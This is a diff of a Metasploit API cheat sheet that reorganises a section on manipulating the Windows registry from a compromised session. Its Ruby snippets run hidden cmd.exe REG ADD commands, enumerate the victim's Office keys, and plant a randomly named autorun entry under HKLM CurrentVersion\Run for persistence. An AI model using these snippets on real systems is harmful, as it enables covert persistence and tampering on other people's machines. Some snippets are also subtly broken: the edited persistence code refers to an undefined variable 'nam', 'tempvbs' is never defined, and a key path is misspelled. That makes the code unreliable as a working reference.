@@ -14,8 +14,8 @@
 | various checks | [various checks ](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#various-checks) | mul = client.framework.exploits.create("multi/handler") |
 | ruby string manipulation | [ruby string manipulation](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#ruby-string-manipulation) | parse = datastore['remote_path'].gsub('\\','\\\\') |
 | listing remote processes | [listing remote processes](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#listting-remote-processes) | session.sys.process.get_processes().each do \|x\| |
-| store loot | [store loot (local)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#store-loot) | tbl = Rex::Ui::Text::Table.new('') |
 | manipulate registry | [manipulate regedit (remote)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#manipulate-regedit) | registry_getvaldata('HKCU\Control Panel','Title') |
+| store loot | [store loot (local)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#store-loot) | tbl = Rex::Ui::Text::Table.new('') |
 | writting exploits | [writting exploits](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#writing-exploits) | exeTEMPLATE = %{ #include <stdio.h> }, |
 
 <br />
@@ -641,6 +641,62 @@ system along with the details like IP, netmask, mac_address etc.
 
 <br /><br /><br />
 
+## MANIPULATE REGEDIT
+
+- **Read remote registry key and store results in local var**
+
+      data = registry_getvaldata('HKCU\Control Panel\Desktop','ScreenSaveActive')
+      print_good("ScreenSaveActive: #{data}")
+
+- **Enumerate regedit remote hives**
+
+      if registry_enumkeys("HKCU\\Software\\Microsoft\\Office")
+        print_good("Remote registry hive [office] found ..")
+      else
+        print_error("Remote registry hive [office] NOT found ..")
+      end
+
+- **Check for office version installed using registry**
+
+      if registry_enumkeys("HKCU\\Software\\Microsoft\\Office\\10.0")
+        data = "10.0"
+      elsif registry_enumkeys("HKCU\\Software\\Microsoft\\Office\\11.0")
+        data = "11.0"
+      elsif registry_enumkeys("HKCU\\Software\\Microsoft\\Office\\12.0")
+        data = "12.0"
+      end
+      print_good("Microsoft office version: #{data}")
+
+- **write reg key remote using cmd_exec()**
+
+      cmd_exec("REG ADD HKCU\\Contol Panel\\Desktop /v ScreenSaveActive /t REG_SZ /d 1 /f")
+
+- **write reg key remote using .process.execute()**
+'execute cmd prompt in a **hidden** channelized windows'<br />
+
+      cmd = "HKCU\\Contol Panel\\Desktop /v ScreenSaveActive /t REG_SZ /d 1 /f"
+      r = session.sys.process.execute("cmd.exe /c REG ADD #{cmd}", nil, {'Hidden' => true, 'Channelized' => true})
+      print_warning("Hijack key: #{cmd}")
+
+- **write reg key remote (msf API)**
+
+      rand = Rex::Text.rand_text_alpha(rand(8)+8)
+      print_status("Installing into autorun as HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{rand}")
+      key = client.sys.registry.open_key(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Windows\CurrentVersion\Run', KEY_WRITE)
+        if(key)
+          key.set_value(nam, session.sys.registry.type2str("REG_SZ"), tempvbs)
+          print_status("Installed into autorun as HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{rand}")
+        else
+          print_status("Error: failed to open the registry key for writing")
+        end
+      end
+
+#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#metasploit-api-cheat-sheet)
+
+---
+
+<br /><br /><br />
+
 ## STORE LOOT
 
 - **store data in loot folder (local)**
@@ -673,39 +729,6 @@ system along with the details like IP, netmask, mac_address etc.
         :update    => :unique_data
         )
       print_status("System info gather ..")
-
-#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#metasploit-api-cheat-sheet)
-
----
-
-<br /><br /><br />
-
-## MANIPULATE REGEDIT
-
-- **Read remote registry key and store results in local var**
-
-      scrnsave_active = registry_getvaldata('HKCU\Control Panel\Desktop','ScreenSaveActive')
-      print_good("ScreenSaveActive: #{scrnsave_active}")
-
-- **write reg key remote**
-'execute cmd prompt in a **hidden** channelized windows'<br />
-
-      cmd = "HKCU\\Contol Panel\\Desktop /v ScreenSaveActive /t REG_SZ /d 1 /f"
-      r = session.sys.process.execute("cmd.exe /c REG ADD #{cmd}", nil, {'Hidden' => true, 'Channelized' => true})
-      print_warning("Hijack key: #{cmd}")
-
-- **write reg key remote**
-
-      nam = Rex::Text.rand_text_alpha(rand(8)+8)
-      print_status("Installing into autorun as HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
-      key = client.sys.registry.open_key(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Windows\CurrentVersion\Run', KEY_WRITE)
-        if(key)
-          key.set_value(nam, session.sys.registry.type2str("REG_SZ"), tempvbs)
-          print_status("Installed into autorun as HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
-        else
-          print_status("Error: failed to open the registry key for writing")
-        end
-      end
 
 #### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#metasploit-api-cheat-sheet)
 
